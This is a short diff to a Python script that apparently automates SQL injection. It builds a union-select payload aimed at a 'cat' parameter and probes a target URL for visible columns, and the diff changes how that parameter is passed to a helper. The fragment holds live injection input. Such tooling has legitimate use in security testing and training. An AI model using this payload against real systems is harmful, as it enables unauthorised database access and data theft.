@@ -25,7 +25,8 @@ def main():
 
     # Search for visible columns and desired data
     payload = f"-1 union select %s from {table_name}"
-    if not (keys := tg.find_visible_columns(url, columns, payload, 'cat', finds)):
+    data = dict(cat=payload)
+    if not (keys := tg.find_visible_columns_and_param(url, columns, data, finds)):
         return False
 
     # Authorization
